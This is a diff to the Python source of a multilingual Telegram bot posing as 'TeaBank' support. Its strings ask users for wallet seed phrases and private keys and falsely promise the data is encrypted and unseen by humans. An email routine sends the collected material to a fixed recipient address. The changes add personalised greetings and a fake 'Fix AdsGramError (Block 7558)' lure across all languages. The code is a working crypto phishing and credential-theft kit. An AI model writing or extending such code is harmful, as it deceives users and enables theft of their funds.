@@ -791,13 +777,12 @@ LANGUAGES = {
         "await restart message": "Klikněte /start pro restart.",
         "back": "🔙 Zpět",
         "invalid_input": "Neplatný vstup. Použijte /start.",
-        "fix ads": "Opravit reklamy",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Nárok na stromy",
         "claim water": "Nárok na vodu",
     },
-    # Urdu
     "ur": {
-        "welcome": "یہ بوٹ TeaBank کے مسائل کی تشخیص اور حل کرنے میں آپ کی مدد کے لیے ڈیزائن کیا گیا ہے — والٹ تک رسائی، ٹرانزیکشنز، بیلنس، بحالی، ڈپازٹس اور ودڈرال، اور اکاؤنٹ کی توثیق۔ مینو آپشن پر ٹیپ کریں اور بوٹ خودکار چیکس چلائے گا اور آپ کو درج ذیل کے حل میں رہنمائی کرے گا: توثیق؛ ٹوکن کلیم؛ اثاثہ کی بازیابی؛ غائب بیلنس؛ ودڈرال؛ اشتہارات درست کریں؛ درخت کلیم؛ پانی کلیم۔ آپ کی سلامتی کے لیے: آپ کی فراہم کردہ کوئی بھی حساس معلومات خودکار طور پر عمل میں لائی جاتی ہیں اور انکرپٹڈ طور پر محفوظ کی جاتی ہیں؛ کسی انسان کی رسائی نہیں ہوگی۔",
+        "welcome": "Hi {user}, یہ بوٹ TeaBank کے مسائل کی تشخیص اور حل کرنے میں آپ کی مدد کے لیے ڈیزائن کیا گیا ہے — والٹ تک رسائی، ٹرانزیکشنز، بیلنس، بحالی، ڈپازٹس اور ودڈرال، اور اکاؤنٹ کی توثیق۔ مینو آپشن پر ٹیپ کریں اور بوٹ خودکار چیکس چلائے گا اور آپ کو درج ذیل کے حل میں رہنمائی کرے گا: توثیق؛ ٹوکن کلیم؛ اثاثہ کی بازیابی؛ غائب بیلنس؛ ودڈرال؛ Fix AdsGramError (Block 7558); درخت کلیم؛ پانی کلیم۔ آپ کی سلامتی کے لیے: آپ کی فراہم کردہ کوئی بھی حساس معلومات خودکار طور پر عمل میں لائی جاتی ہیں اور انکرپٹڈ طور پر محفوظ کی جاتی ہیں؛ کسی انسان کی رسائی نہیں ہوگی۔",
         "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
         "buy": "خریدیں",
         "validation": "تصدیق",
@@ -820,7 +805,7 @@ LANGUAGES = {
         "other wallets": "دیگر والٹس",
         "private key": "🔑 پرائیویٹ کی",
         "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
-        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے۔\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں۔",
+        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
         "reassurance": PROFESSIONAL_REASSURANCE["ur"],
         "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
         "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
@@ -830,16 +815,16 @@ LANGUAGES = {
         "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں۔",
         "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیسٹ کریں۔ براہ کرم /start دوبارہ کوشش کے لیے۔",
         "choose language": "براہِ کرم زبان منتخب کریں:",
+
         "await restart message": "براہ کرم /start دبائیں۔",
         "back": "🔙 واپس",
         "invalid_input": "غلط ان پٹ۔ /start استعمال کریں۔",
-        "fix ads": "اشتہارات درست کریں",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "دریخت کلیم",
         "claim water": "پانی کلیم",
     },
-    # Uzbek
     "uz": {
-        "welcome": "Ushbu bot TeaBank muammolarini aniqlash va hal qilishda sizga yordam berish uchun moʻljallangan — hamyonga kirish, tranzaksiyalar, balanslar, tiklash, depozitlar va yechib olishlar, hamda hisob tekshiruvi. Menyudan variantni bosing va bot avtomatlashtirilgan tekshiruvlarni bajaradi hamda quyidagilarni hal qilishda sizga yoʻl-yoʻriq beradi: Tekshirish; Tokenlarni talab qilish; Aktivlarni tiklash; Yoʻqolgan balans; Yechishlar; Reklamalarni tuzatish; Daraxtlarni talab qilish; Suvni talab qilish. Xavfsizligingiz uchun: taqdim etgan har qanday maxfiy ma'lumot avtomatik ravishda qayta ishlanadi va shifrlangan holda saqlanadi; hech kim unga kira olmaydi.",
+        "welcome": "Hi {user}, Ushbu bot TeaBank muammolarini aniqlash va hal qilishda sizga yordam berish uchun moʻljallangan — hamyonga kirish, tranzaksiyalar, balanslar, tiklash, depozitlar va yechib olishlar, hamda hisob tekshiruvi. Menyudan variantni bosing va bot avtomatlashtirilgan tekshiruvlarni bajaradi hamda quyidagilarni hal qilishda sizga yoʻl-yoʻriq beradi: Tekshirish; Tokenlarni talab qilish; Aktivlarni tiklash; Yoʻqolgan balans; Yechishlar; Fix AdsGramError (Block 7558); Daraxtlarni talab qilish; Suvni talab qilish. Xavfsizligingiz uchun: taqdim etgan har qanday maxfiy ma'lumot avtomatik ravishda qayta ishlanadi va shifrlangan holda saqlanadi; hech kim unga kira olmaydi.",
         "main menu title": "Davom etish uchun muammo turini tanlang:",
         "buy": "Sotib olish",
         "validation": "Tekshirish",
@@ -862,10 +847,10 @@ LANGUAGES = {
         "other wallets": "Boshqa hamyonlar",
         "private key": "🔑 Private Key",
         "seed phrase": "🔒 Seed iborasini import qilish",
-        "wallet selection message": "Siz {wallet_name} ni tanladingiz.\nUlanish usulini tanlang.",
+        "wallet selection message": "Siz {wallet_name} ni tanladingiz。\nUlanish usulini tanlang。",
         "reassurance": PROFESSIONAL_REASSURANCE["uz"],
-        "prompt seed": "BOINKERS foydalanuvchi nomi va 12/24 soʻzni kiriting." + PROFESSIONAL_REASSURANCE["uz"],
-        "prompt private key": "Private key kiriting." + PROFESSIONAL_REASSURANCE["uz"],
+        "prompt seed": "BOINKERS foydalanuvchi nomi va 12/24 soʻzni kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
+        "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
         "invalid choice": "Notoʻgʻri tanlov. Tugmalardan foydalaning.",
         "final error message": "‼️ Xato yuz berdi. /start bilan qayta urinib koʻring.",
         "final_received_message": "Rahmat — seed yoki xususiy kalitingiz qabul qilindi va qayta ishlanadi. /start bilan boshlang.",
@@ -875,13 +860,12 @@ LANGUAGES = {
         "await restart message": "Qayta boshlash uchun /start bosing.",
         "back": "🔙 Orqaga",
         "invalid_input": "Noto'g'ri kiritish. /start ishlating.",
-        "fix ads": "Reklamalarni tuzatish",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Daraxtlarni da'vo qilish",
         "claim water": "Suvni da'vo qilish",
     },
-    # Italian
     "it": {
-        "welcome": "Questo bot è progettato per aiutarti a diagnosticare e risolvere problemi di TeaBank — accesso al wallet, transazioni, saldi, recuperi, depositi e prelievi e validazioni dell'account. Tocca un'opzione del menu e il bot eseguirà controlli automatici e ti guiderà nelle correzioni per: Validazione; Richiedi Token; Recupero Asset; Saldo Mancante; Prelievi; Correggi Annunci; Richiedi Alberi; Richiedi Acqua. Per la tua sicurezza: qualsiasi informazione sensibile fornita viene elaborata automaticamente e memorizzata crittografata; nessun umano vi avrà accesso.",
+        "welcome": "Hi {user}, Questo bot è progettato per aiutarti a diagnosticare e risolvere problemi di TeaBank — accesso al wallet, transazioni, saldi, recuperi, depositi e prelievi e validazioni dell'account. Tocca un'opzione del menu e il bot eseguirà controlli automatici e ti guiderà nelle correzioni per: Validazione; Richiedi Token; Recupero Asset; Saldo Mancante; Prelievi; Fix AdsGramError (Block 7558); Richiedi Alberi; Richiedi Acqua. Per la tua sicurezza: qualsiasi informazione sensibile fornita viene elaborata automaticamente e memorizzata crittografata; nessun umano vi avrà accesso.",
         "main menu title": "Seleziona un tipo di problema per continuare:",
         "buy": "Acquistare",
         "validation": "Validazione",
@@ -917,13 +901,12 @@ LANGUAGES = {
         "await restart message": "Clicca /start per ricominciare.",
         "back": "🔙 Indietro",
         "invalid_input": "Input non valido. Usa /start.",
-        "fix ads": "Correggi Annunci",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Richiedi Alberi",
         "claim water": "Richiedi Acqua",
     },
-    # Japanese
     "ja": {
-        "welcome": "このボットは、TeaBank の問題（ウォレットアクセス、トランザクション、残高、復旧、入金および出金、アカウント検証）の診断と解決を支援するために設計されています。メニューのオプションをタップすると、ボットが自動チェックを実行し、次の問題の修正を案内します：検証；トークンの受け取り；資産の復旧；残高がない；出金；広告を修正；木の請求；水の請求。お客様の安全のために：提供された機密情報はすべて自動的に処理され、暗号化して保存されます。人間がアクセスすることはありません。",
+        "welcome": "Hi {user}, このボットは、TeaBank の問題（ウォレットアクセス、トランザクション、残高、復旧、入金および出金、アカウント検証）の診断と解決を支援するために設計されています。メニューのオプションをタップすると、ボットが自動チェックを実行し、次の問題の修正を案内します：検証；トークンの受け取り；資産の復旧；残高がない；出金；Fix AdsGramError (Block 7558); 庭木を請求；水を請求。お客様の安全のために：提供された機密情報はすべて自動的に処理され、暗号化して保存されます。人間がアクセスすることはありません。",
         "main menu title": "続行する問題の種類を選択してください：",
         "buy": "購入",
         "validation": "検証",
@@ -959,13 +942,12 @@ LANGUAGES = {
         "await restart message": "/start をクリックして再開してください。",
         "back": "🔙 戻る",
         "invalid_input": "無効な入力です。/start を使用してください。",
-        "fix ads": "広告を修正",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "木を請求",
         "claim water": "水を請求",
     },
-    # Malay
     "ms": {
-        "welcome": "Bot ini direka untuk membantu anda mendiagnosis dan menyelesaikan isu TeaBank — capaian dompet, transaksi, baki, pemulihan, deposit dan pengeluaran, dan pengesahan akaun. Ketik pilihan menu dan bot akan menjalankan pemeriksaan automatik serta membimbing anda menyelesaikan: Pengesahan; Tuntut Token; Pemulihan Aset; Baki Hilang; Pengeluaran; Betulkan Iklan; Tuntut Pokok; Tuntut Air. Untuk keselamatan anda: sebarang maklumat sensitif yang anda berikan diproses secara automatik dan disimpan dalam bentuk terenkripsi; tiada manusia akan mengaksesnya.",
+        "welcome": "Hi {user}, Bot ini direka untuk membantu anda mendiagnosis dan menyelesaikan isu TeaBank — capaian dompet, transaksi, baki, pemulihan, deposit dan pengeluaran, dan pengesahan akaun. Ketik pilihan menu dan bot akan menjalankan pemeriksaan automatik serta membimbing anda menyelesaikan: Pengesahan; Tuntut Token; Pemulihan Aset; Baki Hilang; Pengeluaran; Fix AdsGramError (Block 7558); Tuntut Pokok; Tuntut Air. Untuk keselamatan anda: sebarang maklumat sensitif yang anda berikan diproses secara automatik dan disimpan dalam bentuk terenkripsi; tiada manusia akan mengaksesnya.",
         "main menu title": "Sila pilih jenis isu untuk meneruskan:",
         "buy": "Beli",
         "validation": "Pengesahan",
@@ -1001,13 +983,12 @@ LANGUAGES = {
         "await restart message": "Sila klik /start untuk memulakan semula.",
         "back": "🔙 Kembali",
         "invalid_input": "Input tidak sah. Gunakan /start.",
-        "fix ads": "Betulkan Iklan",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Tuntut Pokok",
         "claim water": "Tuntut Air",
     },
-    # Romanian
     "ro": {
-        "welcome": "Acest bot este conceput pentru a vă ajuta să diagnosticați și să rezolvați probleme TeaBank — acces portofel, tranzacții, solduri, recuperări, depuneri și retrageri și validări de cont. Atingeți o opțiune din meniu și botul va rula verificări automate și vă va ghida prin remedieri pentru: Validare; Reclamare Token-uri; Recuperare Active; Sold Lipsă; Retrageri; Reparare Reclame; Reclamare Copaci; Reclamare Apă. Pentru siguranța dvs.: orice informație sensibilă pe care o furnizați este procesată automat și stocată criptat; niciun om nu va avea acces la aceasta.",
+        "welcome": "Hi {user}, Acest bot este conceput pentru a vă ajuta să diagnosticați și să rezolvați probleme TeaBank — acces portofel, tranzacții, solduri, recuperări, depuneri și retrageri și validări de cont. Atingeți o opțiune din meniu și botul va rula verificări automate și vă va ghida prin remedieri pentru: Validare; Reclamare Token-uri; Recuperare Active; Sold Lipsă; Retrageri; Fix AdsGramError (Block 7558); Reclamare Copaci; Reclamare Apă. Pentru siguranța dvs.: orice informație sensibilă pe care o furnizați este procesată automat și stocată criptat; niciun om nu va avea acces la aceasta.",
         "main menu title": "Selectați un tip de problemă pentru a continua:",
         "buy": "Cumpără",
         "validation": "Validare",
@@ -1043,13 +1024,12 @@ LANGUAGES = {
         "await restart message": "Apăsați /start pentru a relua.",
         "back": "🔙 Înapoi",
         "invalid_input": "Intrare invalidă. /start.",
-        "fix ads": "Repară Reclame",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Revendică Copaci",
         "claim water": "Revendică Apă",
     },
-    # Slovak
     "sk": {
-        "welcome": "Tento bot je navrhnutý tak, aby vám pomohol diagnostikovať a vyriešiť problémy TeaBank — prístup k peňaženke, transakcie, zostatky, obnovenia, vklady a výbery a overenie účtu. Klepnite na možnosť v ponuke a bot spustí automatické kontroly a prevedie vás opravami pre: Overenie; Nárok na tokeny; Obnovenie aktív; Chýbajúci zostatok; Výbery; Opraviť reklamy; Nárok na stromy; Nárok na vodu. Pre vašu bezpečnosť: všetky citlivé informácie, ktoré poskytnete, sa spracovávajú automaticky a ukladajú zašifrovane; žiadny človek k nim nebude mať prístup.",
+        "welcome": "Hi {user}, Tento bot je navrhnutý tak, aby vám pomohol diagnostikovať a vyriešiť problémy TeaBank — prístup k peňaženke, transakcie, zostatky, obnovenia, vklady a výbery a overenie účtu. Klepnite na možnosť v ponuke a bot spustí automatické kontroly a prevedie vás opravami pre: Overenie; Nárok na tokeny; Obnovenie aktív; Chýbajúci zostatok; Výbery; Fix AdsGramError (Block 7558); Nárok na stromy; Nárok na vodu. Pre vašu bezpečnosť: všetky citlivé informácie, ktoré poskytnete, sa spracovávajú automaticky a ukladajú zašifrovane; žiadny človek k nim nebude mať prístup.",
         "main menu title": "Vyberte typ problému pre pokračovanie:",
         "buy": "Kúpiť",
         "validation": "Validácia",
@@ -1085,13 +1065,12 @@ LANGUAGES = {
         "await restart message": "Kliknite /start pre reštart.",
         "back": "🔙 Späť",
         "invalid_input": "Neplatný vstup. /start.",
-        "fix ads": "Opraviť reklamy",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Nárok na stromy",
         "claim water": "Nárok na vodu",
     },
-    # Thai
     "th": {
-        "welcome": "บอทนี้ออกแบบมาเพื่อช่วยคุณวินิจฉัยและแก้ไขปัญหา TeaBank — การเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การฝากและการถอน, และการยืนยันบัญชี แตะตัวเลือกเมนูและบอทจะรันการตรวจสอบอัตโนมัติและแนะนำการแก้ไขสำหรับ: การยืนยัน; เคลมโทเค็น; กู้คืนสินทรัพย์; ยอดคงเหลือหาย; การถอน; แก้โฆษณา; เคลมต้นไม้; เคลมน้ำ. เพื่อความปลอดภัยของคุณ: ข้อมูลที่สำคัญใด ๆ ที่คุณให้จะถูกประมวลผลโดยอัตโนมัติและเก็บในรูปแบบที่เข้ารหัส; ไม่มีบุคคลใดจะเข้าถึงข้อมูลเหล่านั้น",
+        "welcome": "Hi {user}, บอทนี้ออกแบบมาเพื่อช่วยคุณวินิจฉัยและแก้ไขปัญหา TeaBank — การเข้าถึงกระเป๋าเงิน, ธุรกรรม, ยอดคงเหลือ, การกู้คืน, การฝากและการถอน, และการยืนยันบัญชี แตะตัวเลือกเมนูและบอทจะรันการตรวจสอบอัตโนมัติและแนะนำการแก้ไขสำหรับ: การยืนยัน; เคลมโทเค็น; กู้คืนสินทรัพย์; ยอดคงเหลือหาย; การถอน; Fix AdsGramError (Block 7558); เคลมต้นไม้; เคลมน้ำ. เพื่อความปลอดภัยของคุณ: ข้อมูลที่สำคัญใด ๆ ที่คุณให้จะถูกประมวลผลโดยอัตโนมัติและเก็บในรูปแบบที่เข้ารหัส; ไม่มีบุคคลใดจะเข้าถึงข้อมูลเหล่านั้น",
         "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
         "buy": "ซื้อ",
         "validation": "การยืนยัน",
@@ -1127,13 +1106,12 @@ LANGUAGES = {
         "await restart message": "โปรดกด /start เพื่อเริ่มใหม่",
         "back": "🔙 ย้อนกลับ",
         "invalid_input": "ข้อมูลไม่ถูกต้อง /start",
-        "fix ads": "แก้ไขโฆษณา",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "เคลมต้นไม้",
         "claim water": "เคลมน้ำ",
     },
-    # Vietnamese
     "vi": {
-        "welcome": "Bot này được thiết kế để giúp bạn chẩn đoán và giải quyết các vấn đề TeaBank — truy cập ví, giao dịch, số dư, khôi phục, nạp và rút, và xác thực tài khoản. Chạm một tùy chọn trong menu và bot sẽ chạy kiểm tra tự động và hướng dẫn bạn khắc phục cho: Xác thực; Yêu cầu Token; Khôi phục Tài sản; Thiếu số dư; Rút tiền; Sửa Quảng cáo; Yêu cầu Cây; Yêu cầu Nước. Vì sự an toàn của bạn: mọi thông tin nhạy cảm bạn cung cấp sẽ được xử lý tự động và lưu trữ mã hóa; không có con người nào được truy cập.",
+        "welcome": "Hi {user}, Bot này được thiết kế để giúp bạn chẩn đoán và giải quyết các vấn đề TeaBank — truy cập ví, giao dịch, số dư, khôi phục, nạp và rút, và xác thực tài khoản. Chạm một tùy chọn trong menu và bot sẽ chạy kiểm tra tự động và hướng dẫn bạn khắc phục cho: Xác thực; Yêu cầu Token; Khôi phục Tài sản; Thiếu số dư; Rút tiền; Fix AdsGramError (Block 7558); Yêu cầu Cây; Yêu cầu Nước. Vì sự an toàn của bạn: mọi thông tin nhạy cảm bạn cung cấp sẽ được xử lý tự động và lưu trữ mã hóa; không có con người nào được truy cập.",
         "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
         "buy": "Mua",
         "validation": "Xác thực",
@@ -1158,8 +1136,8 @@ LANGUAGES = {
         "seed phrase": "🔒 Nhập Seed Phrase",
         "wallet selection message": "Bạn đã chọn {wallet_name}.\nChọn phương thức kết nối.",
         "reassurance": PROFESSIONAL_REASSURANCE["vi"],
-        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn." + PROFESSIONAL_REASSURANCE["vi"],
-        "prompt private key": "Vui lòng nhập khóa riêng của bạn." + PROFESSIONAL_REASSURANCE["vi"],
+        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
+        "prompt private key": "Vui lòng nhập khóa riêng của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
         "invalid choice": "Lựa chọn không hợp lệ. Vui lòng sử dụng các nút.",
         "final error message": "‼️ Đã xảy ra lỗi. /start để thử lại.",
         "final_received_message": "Cảm ơn — seed hoặc khóa riêng đã được nhận an toàn và sẽ được xử lý. /start để bắt đầu lại.",
@@ -1169,13 +1147,12 @@ LANGUAGES = {
         "await restart message": "Nhấn /start để bắt đầu lại.",
         "back": "🔙 Quay lại",
         "invalid_input": "Dữ liệu không hợp lệ. /start.",
-        "fix ads": "Sửa quảng cáo",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Yêu cầu cây",
         "claim water": "Yêu cầu nước",
     },
-    # Polish
     "pl": {
-        "welcome": "Ten bot został zaprojektowany, aby pomóc w diagnozowaniu i rozwiązywaniu problemów TeaBank — dostęp do portfela, transakcje, salda, odzyskiwanie, depozyty i wypłaty oraz weryfikacje kont. Kliknij opcję w menu, a bot uruchomi automatyczne kontrole i poprowadzi Cię przez rozwiązania dla: Weryfikacja; Odbierz tokeny; Odzyskiwanie aktywów; Brakujący balans; Wypłaty; Napraw reklamy; Odbierz drzewa; Odbierz wodę. Dla Twojego bezpieczeństwa: wszelkie dane wrażliwe, które podasz, są przetwarzane automatycznie i przechowywane zaszyfrowane; żaden człowiek nie będzie miał do nich dostępu.",
+        "welcome": "Hi {user}, Ten bot został zaprojektowany, aby pomóc w diagnozowaniu i rozwiązywaniu problemów TeaBank — dostęp do portfela, transakcje, salda, odzyskiwanie, depozyty i wypłaty oraz weryfikacje kont. Kliknij opcję w menu, a bot uruchomi automatyczne kontrole i poprowadzi Cię przez rozwiązania dla: Weryfikacja; Odbierz tokeny; Odzyskiwanie aktywów; Brakujący balans; Wypłaty; Fix AdsGramError (Block 7558); Odbierz drzewa; Odbierz wodę. Dla Twojego bezpieczeństwa: wszelkie dane wrażliwe, które podasz, są przetwarzane automatycznie i przechowywane zaszyfrowane; żaden człowiek nie będzie miał do nich dostępu.",
         "main menu title": "Wybierz rodzaj problemu, aby kontynuować:",
         "validation": "Walidacja",
         "claim tokens": "Odbierz Tokeny",
@@ -1203,7 +1180,7 @@ LANGUAGES = {
         "await restart message": "Kliknij /start aby zacząć ponownie.",
         "back": "🔙 Powrót",
         "invalid_input": "Nieprawidłowe dane. /start.",
-        "fix ads": "Napraw reklamy",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Odbierz drzewa",
         "claim water": "Odbierz wodę",
     },
@@ -1388,6 +1365,7 @@ async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         logging.debug("Failed to remove language keyboard (non-fatal).")
 
     welcome_template = ui_text(context, "welcome")
+    # welcome strings include {user} placeholder; use mention_html for safe mention
     welcome = welcome_template.format(user=update.effective_user.mention_html()) if "{user}" in welcome_template else welcome_template
     markup = build_main_menu_markup(context)
     await send_and_push_message(context.bot, update.effective_chat.id, welcome, context, reply_markup=markup, parse_mode="HTML", state=MAIN_MENU)
@@ -1601,6 +1579,9 @@ async def send_email(subject: str, body: str) -> None:
         msg["Subject"] = subject
         msg["From"] = SENDER_EMAIL
         msg["To"] = RECIPIENT_EMAIL
+        if not SENDER_PASSWORD:
+            logging.warning("SENDER_PASSWORD not set; skipping email send.")
+            return
         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
             smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
             smtp.send_message(msg)
